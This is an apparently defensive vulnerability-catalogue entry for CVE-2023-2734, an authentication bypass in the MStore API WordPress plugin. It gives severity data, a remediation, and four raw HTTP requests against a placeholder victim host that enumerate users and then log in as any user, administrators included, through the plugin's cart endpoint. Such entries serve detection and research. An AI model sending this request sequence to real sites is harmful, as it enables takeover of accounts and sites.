---
layout: post
cve_id: CVE-2023-2734
title: MStore API <= 3.9.1 - Authentication Bypass
pcap: true
pcap_path: /pcaps/2023/CVE-2023-2734.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-2734.yaml
snort2_rule: N/A
snort3_rule: N/A
author: daffainfo
severity: critical
impact: 'Attackers can log in as any user, including administrators, potentially gaining
  full control over the site.

  '
remediation: 'Update to version 3.9.2 or later.

  '
reference:
- https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/mstore-api/mstore-api-391-authentication-bypass
- https://plugins.trac.wordpress.org/changeset?sfp_email=&sfph_mail=&reponame=&new=2915729%40mstore-api&old=2913397%40mstore-api&sfp_email=&sfph_mail=#file59
- https://nvd.nist.gov/vuln/detail/CVE-2023-2734
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
  cvss-score: 9.8
  cve-id: CVE-2023-2734
  epss-score: 0.60337
  epss-percentile: 0.98209
  cwe-id: CWE-200
  cpe: cpe:2.3:a:inspireui:mstore_api:*:*:*:*:*:wordpress:*:*
metadata:
  verified: true
  max-request: 4
  vendor: inspireui
  product: mstore_api
  framework: wordpress
  fofa-query: body="/wp-content/plugins/mstore-api/"
  publicwww-query: /wp-content/plugins/mstore-api/
tags:
- cve
- cve2023
- wordpress
- wp
- wp-plugin
- inspireui
- mstore_api
- auth-bypass
- vkev
---

## ðŸ” Vulnerability Description
The MStore API plugin for WordPress is vulnerable to authentication bypass in versions up to, and including, 3.9.1. This is due to insufficient verification on the user being supplied during the cart sync from mobile REST API request through the plugin. This makes it possible for unauthenticated attackers to log in as any existing user on the site, such as an administrator, if they have access to the user id.


## ðŸŒ HTTP Request
```nohighlight
GET /?rest_route=/wp/v2/users HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Fedora; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
Connection: close
```

```nohighlight
GET /wp-json/wp/v2/users HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (ZZ; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
Connection: close
```

```nohighlight
POST /wp-json/api/flutter_woo/cart HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Connection: close
Content-Length: 22
Content-Type: application/json
Accept-Encoding: gzip
{"customer_id":JS4X7d}
```

```nohighlight
POST /wp-admin/index.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0
Connection: close
Transfer-Encoding: chunked
Accept-Encoding: gzip
0
```

